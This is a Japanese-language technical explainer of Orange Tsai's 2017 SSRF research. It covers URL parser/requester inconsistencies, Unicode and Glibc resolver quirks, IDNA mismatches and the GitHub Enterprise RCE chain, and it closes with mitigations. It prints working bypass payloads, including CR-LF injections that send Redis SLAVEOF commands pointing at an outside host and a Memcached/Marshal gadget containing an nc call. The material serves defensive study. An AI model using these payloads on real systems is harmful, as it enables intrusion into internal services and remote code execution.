## URLパーサ差の原典：Orange Tsai「A New Era of SSRF」

SSRF（Server-Side Request Forgery：サーバに任意の宛先へリクエストを送らせる攻撃）対策の多くは、「入力されたURLを一度パースし、ホスト名やポートを検査して、問題なければそのURLで実際にリクエストを投げる」という形をとる。この設計には、一見しただけでは気づきにくい致命的な前提がある——**「検査に使うパーサ」と「実際にリクエストを送るライブラリ（リクエスタ）」が、同じURLをまったく同じように解釈する**という前提だ。

Orange Tsai が Black Hat USA 2017 で発表した「A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!」は、この前提が現実にはほとんど成り立っていないことを、主要言語のURLパーサを横断的に検証して示した研究である。以降、SSRFフィルタ回避を語るうえで避けて通れない「原典」となった。本節では、この講演の技術的核心——**パーサとリクエスタの解釈差（inconsistency）**の原理と具体的手口——を、防御側が仕組みとして理解できるよう詳細に解説する。

> ⚠️ **一部取得についての注記**: 発表スライドPDF本体（Black Hat配布版, 90ページ）は自動取得（WebFetch経由）でバイナリとして保存されたうえ、ローカルでテキスト抽出に成功したため、以下の記述は**原典スライドの実物テキストに基づく**。GitHub上のスライド集リポジトリ（orangetw/My-Presentation-Slides）は概要のみ取得できた。原典を直接確認したい場合は下記URLを参照のこと。

---

### この研究の全体像：なぜ「URLの検証」は難しいのか

Orange Tsai はまず、URL検証が難しい根本理由を2点挙げる。

1. **仕様が複数存在し、しかも「仕様」でしかない。** URLの構文は RFC 2396・RFC 3986 で定義されているが、これらはあくまで規格書であって実装ではない。
2. **WHATWG がRFCベースの現代的な実装仕様を定めたが、各言語は依然として独自実装を持ち続けている。**

つまり、同じ1本のURL文字列でも「どこがホストで、どこがポートで、どこがパスか」の切り分けが、パーサごとに食い違う。攻撃者はこの食い違いを突く。

RFC 3986 のURL構成要素はこう定義される。

```
         authority                query
  foo://example.com:8042/over/there?name=bar#nose
 scheme                    path             fragment
```

Orange Tsai の関心は「HTTP/HTTPS の scheme」と、とりわけ「authority（誰に接続するかを決める部分）」に集中する。なぜなら、SSRF防御が守りたいのは「どのホスト・どのポートに繋ぐか」だからだ。RFC 3986 では authority は次の構造を持つ。

```
authority = [ userinfo "@" ] host [ ":" port ]
```

つまり `ユーザ情報@ホスト:ポート` である。この `@` と `:`、そして authority の「終端をどこと見なすか」の解釈差が、以降のあらゆる回避技法の温床になる。

> **用語**: 本節で「パーサ」とは URLを構文解析して host/port などの部品を取り出すコード（PHPの `parse_url()`、Pythonの `urlparse`、Rubyの `URI` など）を指す。「リクエスタ」とは実際にソケットを開いて通信するコード（cURL/libcurl、Ruby `Net::HTTP`、NodeJS `http` など）を指す。SSRF回避の本質は、**この2者に別々のホストを見せること**にある。

---

### 導入例：1本のURLで4つの解釈

講演冒頭の「Quick Fun Example」は問題の性質を鮮やかに示す。

```
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
```

このURLをPythonの各ライブラリに食わせると、接続先ホストの判定が**ライブラリごとに異なる**。`urllib`・`urllib2`・`requests`・`httplib` がそれぞれ別のホスト（`1.1.1.1`、`2.2.2.2`、`3.3.3.3` のいずれか）を宛先と解釈する。スライドの言葉を借りれば「Python is so Hard」——同じ言語の標準/準標準ライブラリ間ですら統一されていないのだ。

**なぜこうなるのか。** authority の終端判定に使う文字（スペース、`&`、`#`、`@`）の扱いがパーサごとに違うためである。RFC 3986 は authority を「`//` に続き、次の `/`・`?`・`#`、または文字列終端で終わる」と定めているが（後述）、`#` を fragment 区切りとして先に切るか、`@` を userinfo 区切りとして優先するか、スペースをどう扱うかは実装依存。結果、ある実装は最初の `@` の左を userinfo と見て `2.2.2.2` に、別の実装は `#` 以降を捨てて別のホストに繋ぐ。**検査を通したホストと、実際に繋がるホストが別物になる**——これがSSRFフィルタ回避の原型である。

---

### 各ライブラリの脆弱性マップ（原典の一覧表）

Orange Tsai は主要ライブラリを「CR-LF Injection（Path / Host / SNI）」と「URL Parsing（Port Injection / Host Injection / Path Injection）」の観点で総覧した。原典スライドの表を再構成すると、危険（💀）が付いた箇所は次のとおり。

| ライブラリ | CRLF: Path | CRLF: Host | CRLF: SNI | Port注入 | Host注入 | Path注入 |
|---|---|---|---|---|---|---|
| Python httplib | 💀 | 💀 | 💀 | | | |
| Python urllib | | 💀 | 💀 | | | 💀 |
| Python urllib2 | | 💀 | 💀 | | | |
| Ruby Net::HTTP | 💀 | 💀 | 💀 | | | |
| Java net.URL | | 💀 | | | | 💀 |
| Perl LWP | | | 💀 | 💀 | | |
| NodeJS http | 💀 | | | | | 💀 |
| PHP http_wrapper | | | 💀 | | 💀 | |
| Wget | | 💀 | 💀 | | | |
| cURL | | | 💀 | 💀 | | |

この表が示す教訓は明快だ。**「どのライブラリも何らかの欠陥を持つ」。** したがって「安全なパーサを選ぶ」ではSSRFは根絶できず、後述する設計レベルの対策（IP直接指定など）が必要になる。

---

### URLパーサを騙す：具体的手口とその原理

#### 手口1：多重コロンによるポート判定のズレ

次のPHPコードは典型的なSSRF検査である。

```php
$url = 'http://' . $_GET[url];
$parsed = parse_url($url);
if ( $parsed[port] == 80 && $parsed[host] == 'google.com') {
  readfile($url);
} else {
  die('You Shall Not Pass');
}
```

ここに次を与える。

```
http://127.0.0.1:11211:80/
```

**なぜ抜けるか。** PHPの `parse_url()` とPerlの `URI` は、末尾寄りの `:80` をポートと解釈し「port=80」と判定する場合がある。一方 `readfile()`（内部はPHPのストリームラッパ）やPerlの `LWP`（リクエスタ）は先頭側の `127.0.0.1:11211` に接続する。**検査は「port=80」を見て通し、実際には 11211 番（Memcached）に繋がる**——パーサとリクエスタでポートの読み取りがずれた結果だ。

#### 手口2：`#`（fragment）と `@`（userinfo）の優先順位差

```
http://google.com#@evil.com/
```

**なぜ抜けるか。** PHPの `parse_url()` は `#` を fragment 区切りとみなし、host を `google.com` と判定する。ところが PHP の `readfile()`（リクエスタ側）は同じ文字列を別様に扱い、`@` を userinfo 区切りとして解釈して `evil.com` に繋いでしまう。cURL・PHP・Python がこの種の問題を抱えた。

Orange Tsai はこの挙動を RFC 3986 section 3.2 に照らして説明する。

> The authority component is preceded by a double slash ("//") and is terminated by the next slash ("/"), question mark ("?"), or number sign ("#") character, or by the end of the URI.
>（authority は `//` に続き、次の `/`・`?`・`#`、または URI 終端で終わる）

規格は「`#` で authority が終わる」と読める。だから `parse_url()` は正しく `#` で切る。しかしリクエスタが規格どおりに切らない（`@` を先に見る）と、両者が別ホストを指す。**「どちらか一方がRFC違反」なのではなく、解釈の粒度が違うだけで攻撃が成立する**点が重要である。

#### 手口3：二重の `@` によるホスト詐称

```
http://foo@evil.com:80@google.com/
```

**なぜ抜けるか。** `@` が2つあるとき「userinfo と host の境界をどこに置くか」で実装が割れる。cURL/libcurl は最後の `@` の右（`google.com`）を host とする一方、NodeJS `url`・Perl `URI`・Go `net/url`・PHP `parse_url()`・Ruby `addressable` は別の切り方をする。原典の対応表では、この文字列に対して PHP `parse_url` / Perl `URI` / Ruby `addressable` / NodeJS `url` / Go `net/url` が「危険な解釈」をしたと示されている（Ruby の `uri`・Java `net.URL`・Python `urlparse` は影響なし）。検査に使う言語パーサと、リクエスタである cURL の間でホストが食い違えばSSRFになる。

#### 手口4：cURLパッチのスペース回避（Won't Fix）

Orange Tsai はこの `@` 問題を cURL チームに報告し、パッチが素早く出た。ところが**スペース1個で回避できた**。

```
http://foo@127.0.0.1 @google.com/
```

**なぜ抜けるか。** パッチは特定の構文パターンを弾いたが、host 部にスペースを含めると別経路で解釈され、cURL は `127.0.0.1` に接続する。再報告に対する回答が象徴的だ。

> "curl doesn't verify that the URL is 100% syntactically correct. It is instead documented to work with URLs and sort of assumes that you pass it correct input"
>（cURLはURLが構文的に100%正しいことを検証しない。正しい入力が渡される前提で動く、と文書化されている）

結論は **Won't Fix**（修正しない）。しかも前のパッチは cURL 7.54.0 でも適用されたまま。ここから学ぶべきは、**「入力URLをそのままリクエスタに渡す設計自体が誤り」**という後述の教訓である。リクエスタ側は「正しい入力前提」で動くため、検証責任はアプリ側にある。

---

### NodeJS の Unicode 失敗：全角文字がパスとホストを壊す

NodeJSの `http` モジュールには、Unicode正規化に起因する独特の欠陥があった。まずパストラバーサル。

```js
var base = "http://orange.tw/sandbox/";
var path = req.query.path;
if (path.indexOf("..") == -1) {   // ".." が無ければ安全と判断
  http.get(base + path, callback);
}
```

`".."` を含まなければ安全、という素朴な検査だが、次で破れる。

```
http://orange.tw/sandbox/ＮＮ/passwd        (全角N, U+FF2E)
http://orange.tw/sandbox/\xFF\x2E\xFF\x2E/passwd
       ↓ NodeJSのHTTP処理内で正規化されると…
http://orange.tw/sandbox/../passwd
```

**なぜこうなるか。** NodeJSのHTTP層が特定のマルチバイト列（全角文字や `\xFF\x2E` のようなバイト列）を正規化・変換した結果、`/` や `..` に化ける。原典の表現では「`/` is new `../`（NodeJS HTTP では `/` が新たな `../` になる）」。アプリの `indexOf("..")` 検査は変換**前**の文字列を見ているので、`..` は存在せず検査を通過する。sink（入力が最終的に解釈される危険な場所——ここではHTTPリクエストのパス構築）に届く頃には `../` へ化けている。**検査時点の文字列とリクエスト時点の文字列が別物になる**、これも解釈差の一種だ。

さらに、NodeJSの `http` モジュールは通常のCR-LFインジェクション（`\r\n` 注入）は防ぐ。素の注入は次のようにエンコードされて無害化される。

```
http://127.0.0.1:6379/\r\nSLAVEOF orange.tw 6379\r\n
  >> GET /%0D%0ASLAVEOF%20orange.tw%206379%0D%0A HTTP/1.1   ← エンコードされ改行にならない
```

ところが**全角の改行類似文字 U+FF0D / U+FF0A で保護を破れる**。

```
http://127.0.0.1:6379/－＊SLAVEOF＠orange.tw＠6379－＊
  >> GET /
  >> SLAVEOF orange.tw 6379         ← 実際の改行として送信される
  >>  HTTP/1.1
  >> Host: 127.0.0.1:6379
```

**なぜか。** CR-LFフィルタはASCIIの `\r`(0x0D)/`\n`(0x0A) しか見ていない。全角ダッシュ・全角記号がHTTP層の正規化で改行相当に変換されると、フィルタをすり抜けて本物の改行になり、Redis の `SLAVEOF` コマンドを注入できる（プロトコルスマグリング）。教訓は「**フィルタは正規化の前、変換は正規化の後**」という時系列のズレだ。

---

### Glibc NSS の機能悪用：OS のリゾルバが攻撃面になる

ここから攻撃面はURLライブラリを越え、**OS（Linux Glibc）のホスト名解決**に及ぶ。SSRF検査が `gethostbyname()` / `getaddrinfo()` でIPを解決して「そのIPが内部か」を見る設計は多い。ところがこの解決関数自体が余計な機能を持つ。

#### 機能1：RFC 1035 由来の10進エスケープ

Glibc の `resolv/ns_name.c` の `ns_name_pton()`（ASCII文字列をRFC1035形式のドメイン名にエンコードする関数）は、`\DDD`（バックスラッシュ+10進3桁）を1文字として解釈する。

```c
char *host = "or\\097nge.tw";   // \097 は 'a'
gethostbyname(host);            // → orange.tw として解決 → 50.116.8.239
```

Pythonでも同様。

```python
>>> host = '\\o\\r\\a\\n\\g\\e.t\\w'
>>> print host
\o\r\a\n\g\e.t\w
>>> socket.gethostbyname(host)
'50.116.8.239'                  # orange.tw に解決される
```

**なぜ危険か。** ホスト名ブラックリスト（`orange.tw` を禁止、など）を文字列一致で行っていると、`or\097nge.tw` のような表記は「別の文字列」として検査をすり抜け、解決段階で本来のホストに化ける。

#### 機能2：`getaddrinfo()` が末尾のゴミを切る

```c
getaddrinfo("127.0.0.1 foo", NULL, NULL, &res);   // → 127.0.0.1
```

```python
>>> socket.gethostbyname("127.0.0.1\r\nfoo")
'127.0.0.1'
```

**なぜか。** Linux の `getaddrinfo()` は、有効なIP/ホストの後ろに空白（スペース・タブ・CR-LF）が続くと、それ以降の「ゴミ」を無視して先頭を解決する。多くの実装がこの `getaddrinfo()` に依存しているため、影響は広い。

#### 機能3：タブ区切りとホスト詐称、そして二重デコード

上記を組み合わせると、URL上でホストを偽装できる。

```
http://127.0.0.1\tfoo.google.com
http://127.0.0.1%09foo.google.com
http://127.0.0.1%2509foo.google.com
```

**なぜ最後の二重エンコードが効くか。** 一部の実装は**URLを2回デコードする**。`%2509` は1回目のデコードで `%09`、2回目で `\t`(タブ)になる。すると `getaddrinfo()` はタブ以降を切って `127.0.0.1` を解決する。しかしフィルタ（検査側）は1回だけデコードした `127.0.0.1%09foo.google.com` を「host=127.0.0.1...google.com」と誤読するか、あるいは `foo.google.com` を host と見なして「許可」してしまう。**デコード回数の差**が新たな解釈差を生む好例だ。

#### 機能4：Host ヘッダ経由のプロトコルスマグリング

HTTP/1.1 はリクエストに Host ヘッダを要求し、cURL はURLのホスト名をそのまま Host ヘッダに書く。

```
$ curl -vvv http://I-am-a-very-very-weird-domain.com
>> GET / HTTP/1.1
>> Host: I-am-a-very-very-weird-domain.com
```

この「ホスト名がそのまま Host ヘッダに載る」性質と、Glibc がホスト名内の空白以降を無視する性質を組み合わせる。

```
http://127.0.0.1\r\nSLAVEOF orange.tw 6379\r\n:6379/
$ nc -vvlp 6379
>> GET / HTTP/1.1
>> Host: 127.0.0.1
>> SLAVEOF orange.tw 6379       ← Host ヘッダに紛れて改行注入 → Redis コマンド
>> :6379
```

**なぜか。** `getaddrinfo()` は `127.0.0.1\r\n...` のうち `127.0.0.1` だけを解決して接続する（機能2）。一方 cURL はホスト名全体を Host ヘッダに書き出すため、改行が実リクエストに混入し、Redis に `SLAVEOF`（レプリケーション乗っ取り）を送れる。HTTPS でも同じ手が SNI（TLS ClientHello 内のサーバ名。暗号化されない）に対して効く。

```
https://127.0.0.1\r\nSET foo 0 60 5\r\n:443/
>> ...127.0.0.1
>> SET foo 0 60 5              ← SNI に平文で載り、そのまま宛先に届く
```

---

### CVE-2016-5699 パッチのバイパス（Python）

Python は過去に `HTTPConnection.putheader()` のCR-LFインジェクション（**CVE-2016-5699**）を修正した。パッチは不正なヘッダ値をこう弾く。

```python
_is_illegal_header_value = \
    re.compile(rb'\n(?![ \t])|\r(?![ \t\n])').search
```

この正規表現は「後ろに空白/タブが続かない `\n`」「後ろに空白/タブ/改行が続かない `\r`」を不正とみなす。裏を返せば、**改行の直後にスペースを置けば「正当な折り返し（header folding）」とみなされて通る**。

```python
>>> url = 'http://0\r\n SLAVEOF orange.tw 6379\r\n :80'
>>> urllib.urlopen(url)
```

実際に Redis/Memcached に対して次のように効く。

```
http://0\r\n SLAVEOF orange.tw 6379\r\n :6379/
>> GET / HTTP/1.0
>> Host: 0
>>  SLAVEOF orange.tw 6379      ← 先頭スペースで検査を通過し、実際は改行注入
<< +OK Already connected to specified master
```

**なぜか。** HTTPの歴史的仕様「行頭に空白を置くと直前ヘッダの継続とみなす」を、Redis/Memcached のようなテキストプロトコルは気にしない（不明なコマンドとして無視して次の行を処理する）。よってHTTP的には「合法なヘッダ折り返し」、Redis的には「独立したコマンド行」という**プロトコル間の解釈差**で、パッチ済みでも注入が通った。ホスト `0` は `0.0.0.0`＝localhost を指す点にも注意。

---

### IDNA 標準の不整合：国際化ドメイン名の落とし穴

最後の攻撃面は **IDNA**（Internationalized Domain Names in Applications：Unicodeドメイン名を `xn--` で始まる ASCII 表現＝Punycode に変換する規格）だ。問題は、**パーサとリクエスタが異なる IDNA 標準（IDNA2003 / UTS46 / IDNA2008）を使う**ことで、同じ入力が別ドメインに化ける点にある。

| 入力 | IDNA2003 | UTS46 | IDNA2008 |
|---|---|---|---|
| `ⓖⓞⓞⓖⓛⓔ.com` | google.com | google.com | Invalid |
| `g‍oogle.com` | google.com | google.com | xn--google-pf0c.com |
| `baß.de` | bass.de | bass.de | xn--ba-hia.de |

たとえば `ß`（ドイツ語エスツェット）の扱いを見ると混乱がわかる。

```js
>> "ß".toLowerCase()          // "ß"
>> "ß".toUpperCase()          // "SS"
>> ["ss", "SS"].indexOf("ß")  // false（どちらとも一致しない）
>> location.href = "http://wordpreß.com"   // → wordpress.com に飛ぶ実装がある
```

**なぜ危険か。** SSRF検査で「`ß.orange.tw` を解決したら 127.0.0.1 だった、でも `gethostbynamel()` には IDNA 変換器が無いので解決に失敗し、危険IPリストに引っかからない」——一方 cURL（リクエスタ）は IDNA 変換を行って `xn--...` に直し、実際に 127.0.0.1 に繋ぐ。検査器とリクエスタで**変換の有無・変換規格が違う**ため、検査を素通りする。

---

### ケーススタディ：解釈差を突く実戦（防御目的の解説）

Orange Tsai は、以上の原理が実プロダクトで通用することを WordPress・vBulletin・MyBB・GitHub Enterprise で示した。**以下は攻撃技法を仕組みとして理解し、自らの防御設計を点検するための解説であり、無許可の標的への適用を促すものではない。** WordPress の3件はSSRF対策に注力していたにもかかわらず回避され、2017年2月25日の報告時点で未修正だったため、責任ある開示の観点から、公開・修正が進んだ MyBB を代表例に説明されている。

各製品は「パーサ・DNSチェッカ・リクエスタ」に別々の実装を使っていた。

| 製品 | URLパーサ | DNSチェッカ | リクエスタ（優先） |
|---|---|---|---|
| WordPress | `parse_url()` | `gethostbyname()` | cURL |
| vBulletin | `parse_url()` | なし | cURL |
| MyBB | `parse_url()` | `gethostbynamel()` | cURL |

回避手法は3つ。

**#1 TOCTOU（Time-of-check to Time-of-use）＝DNSリバインディング。** 検査時と使用時でDNS応答を変える。

```php
$addresses = gethostbynamel($url_components['host']);  // ①検査: 1.2.3.4 が返る（正常）
// ... ブラックリスト照合 ...
curl_setopt($ch, CURLOPT_URL, $url);                   // ②使用: cURLが再度DNSを引く
curl_exec($ch);                                        //   このとき 127.0.0.1 が返る → SSRF
```

**なぜか。** アプリはDNSを1回引いて検査するが、cURL は接続時に**もう一度**引く。攻撃者が短TTLで同じホスト名に対し1回目は安全IP・2回目は 127.0.0.1 を返せば、「検査したIP」と「接続するIP」が別物になる。検査とリクエストの間に時間差（DNS解決が2回）があることが原因だ。

**#2 DNSチェッカとリクエスタの IDNA 差（前掲の原理）。**

```php
$url = 'http://ß.orange.tw/';           // 実体は 127.0.0.1
$host = parse_url($url)[host];
$addresses = gethostbynamel($host);     // bool(false)：IDNA変換器が無く解決失敗
if ($address) { /* ホワイトリスト照合 */ } // ← falseなので検査ブロックを素通り
curl_setopt($ch, CURLOPT_URL, $url);
curl_exec($ch);                          // cURLはIDNA変換して 127.0.0.1 に接続
```

**#3 パーサとリクエスタのホスト/ポート差（前掲の手口2・3）。**

```php
// PHP 7.0.13 で修正された例
$url = 'http://127.0.0.1:11211#@google.com:80/';
$parsed = parse_url($url);
$parsed[host];  // "google.com"（検査を通る）
$parsed[port];  // 80
curl($url);     // 実際は 127.0.0.1:11211 を取得

// cURL 7.54 で修正（Ubuntu 17.04 の libcurl は 7.52.1 のまま=未修正）
$url = 'http://foo@127.0.0.1:11211@google.com:80/';   // 同様に 127.0.0.1:11211 へ

// cURL が Won't Fix とした版（スペース使用）
$url = 'http://foo@127.0.0.1 @google.com:11211/';     // 127.0.0.1:11211 へ
```

#### GitHub Enterprise：SSRF を RCE に育てる連鎖

最も有名な応用が、GitHub Enterprise（GitHubのオンプレ版、Ruby on Rails 製）で**4つの脆弱性を連鎖**させ、リモートコード実行（RCE）に到達した事例だ。GitHub 3rd Bug Bounty Anniversary で $12,500 を獲得している（GitHub Enterprise < 2.8.7 で修正）。

1. **Webhook の SSRF 回避。** URL取得に gem `faraday`、ホスト遮断に `faraday-restrict-ip-addresses`（localhost・127.0.0.1 等をブラックリスト）を使うが、`http://0/`（`0`＝0.0.0.0＝localhost）で回避。ただし302リダイレクト不可・HTTP/HTTPS以外不可・CR-LF不可・POSTのみ、という制約付きの限定的SSRF。
2. **内部 Graphite への二段目SSRF。** GitHub Enterprise はグラフ描画に Graphite（`127.0.0.1:8000`）を使う。Graphite は受け取ったURLで自らHTTPリクエストを飛ばす（SSRFプロキシ化）。
   ```python
   url = request.GET['url']
   proto, server, path, query, frag = urlsplit(url)
   conn = HTTPConnection(server)
   conn.request('GET', path)
   ```
3. **Graphite の CR-LF インジェクション。** Graphite は Python 製で、二段目SSRFの実装が `httplib.HTTPConnection`——前述のとおりCR-LFに脆弱。ここで任意プロトコルをスマグリングできる。
4. **Memcached gem の安全でない Marshal。** GitHub Enterprise は Memcached をキャッシュに使い、Rubyオブジェクトを `Marshal`（Rubyのオブジェクト直列化）で保存する。Memcached にニセのシリアライズデータを注入し、それが `Marshal.load` される際に任意コード実行に至る。

最終ペイロード（防御理解のための抜粋。実際は httplib のCR-LFで Memcached の `set` コマンドを注入し、`ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy` と `ERB` を悪用する Marshal ガジェットを仕込む）。

```
http://0:8000/composer/send_email
  ?to=orange@chroot.org
  &url=http://127.0.0.1:11211/%0D%0Aset%20githubproductionsearch/queries/...
       ...%0D%0A%04%08o%3A%40ActiveSupport%3A%3ADeprecation...ERB...%60id%20%7C%20nc...%60...
```

`%0D%0A`（CR-LF）でMemcachedプロトコルに切り替え、`\x04\x08`（Ruby Marshal のマジックバイト）以降にガジェットチェーンを置く。1本のURLパラメータが「一段目SSRF→二段目SSRF→CR-LF→Memcached→Marshal→RCE」と連鎖していく点に、解釈差攻撃の破壊力が集約されている。

> 出典: Orange Tsai, "A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!", Black Hat USA 2017 スライド — https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf

---

### 原典の結論：緩和策と教訓

Orange Tsai が提示した緩和策（Mitigations）は、本節のすべての手口を無効化する設計原則に収斂する。

- **アプリケーション層：解決済みのIPとホスト名だけを使い、入力URLを再利用しない。**
  これが最重要である。本節で見たあらゆる回避（パーサ差・二重デコード・IDNA差・DNSリバインディング）は「検査した文字列をそのままリクエスタに渡す」ことで成立する。検査で得た**IPアドレスに対して直接接続し、Host ヘッダも自分で組み立てる**なら、パーサとリクエスタの解釈差は原理的に発生しない。DNSリバインディングも、解決したIPをそのまま使えば「2回目の解決」が消えるため封じられる。
- **ネットワーク層：ファイアウォール／ネットワークポリシーで内部宛トラフィックを遮断する。** アプリ側の検証が破られても、SSRFの被害範囲（内部サービスへの到達）を止める多層防御。
- **既存プロジェクトの活用：** `SafeCurl`（@fin1te）、`Advocate`（@JordanMilne）。これらは「解決したIPで接続する」「リダイレクト先も再検証する」といった安全な取得を実装している。

原典が示した新しい攻撃面（Black Hat Sound Bytes）は次のとおり。SSRF回避としての **URLパース問題** と **IDNA標準の悪用**、プロトコルスマグリングの新経路としての **Linux Glibc NSS の機能** と **NodeJS の Unicode 失敗**、そしてそれらを束ねたケーススタディである。

防御側にとっての一行の教訓はこうだ——**「URLを検査してから同じURLで接続する」限り、検査器とリクエスタの解釈差は必ずどこかに残る。検査で得た結果（IP）そのもので接続せよ。**

> 出典: Orange Tsai, "A New Era of SSRF ..." Black Hat USA 2017（および同スライドのDEFCON/Black Hat Asia 2018/HITCON/CODE BLUE 版） — https://github.com/orangetw/My-Presentation-Slides
